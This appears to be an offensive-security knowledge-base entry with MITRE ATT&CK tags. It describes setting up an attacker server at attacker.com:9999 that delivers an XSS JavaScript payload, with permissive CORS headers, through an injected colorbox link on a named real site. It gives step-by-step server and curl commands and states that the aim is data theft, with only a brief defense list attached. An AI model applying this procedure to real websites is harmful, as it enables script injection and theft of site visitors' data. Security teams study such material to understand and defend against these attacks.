---
tags:
  - payload-delivery
  - server-setup
  - cors-bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:20.332Z'
sub_techniques: []
id: eb341524-4223-45dd-a774-1c60ba2bea01
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Up-Attacker-Server-for-Payload-Delivery

## Summary

This procedure sets up an external HTTP server to serve a malicious JavaScript payload in response to requests from the victim's browser, triggered by the injected colorbox href, including CORS headers to ensure cross-origin loading.

## Description

Once the malicious URL injects the href to attacker.com:9999, the colorbox plugin fetches content from this server upon click. The server must respond with HTTP/1.1 200 OK, Content-Length: 39, Access-Control-Allow-Origin: *, Access-Control-Allow-Headers: x-requested-with, and the body <script>alert(document.domain)</script>. This executes in the victim's secnews.gr context, enabling data theft. Use a domain like attacker.com to avoid direct blocking; port 9999 is specified for non-standard access.

## Requirements

1. Control over a public domain and server (e.g., VPS)
2. Ability to host HTTP server on port 9999
3. Basic networking knowledge for CORS headers

## Defense

Defensive measures and detection strategies:

- Block or monitor outbound requests to unknown ports/domains from web apps
- Implement strict CSP to prevent script insertion from external sources
- Log and alert on anomalous CORS header usage in responses

## Objectives

1. Host JavaScript payload accessible via HTTP
2. Ensure CORS allows loading in victim's origin
3. Respond quickly to enable seamless execution

## Instructions

### Step 1: Launch HTTP Server

**Context**: Start a server that serves the fixed payload response.

**Command**:
```bash
# Example using Python (adapt for production)
python3 -m http.server 9999 --bind attacker.com
```

> Customize the response handler to always return the specified headers and <script>alert(document.domain)</script>. Test by curling http://attacker.com:9999.

### Step 2: Verify Server Response

**Context**: Confirm the payload and headers are correct.

**Command**:
```bash
curl -I http://attacker.com:9999
curl http://attacker.com:9999
```

> Headers should include 200 OK, Access-Control-Allow-Origin: *, and body the alert script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- payload-hosting
- javascript-execution
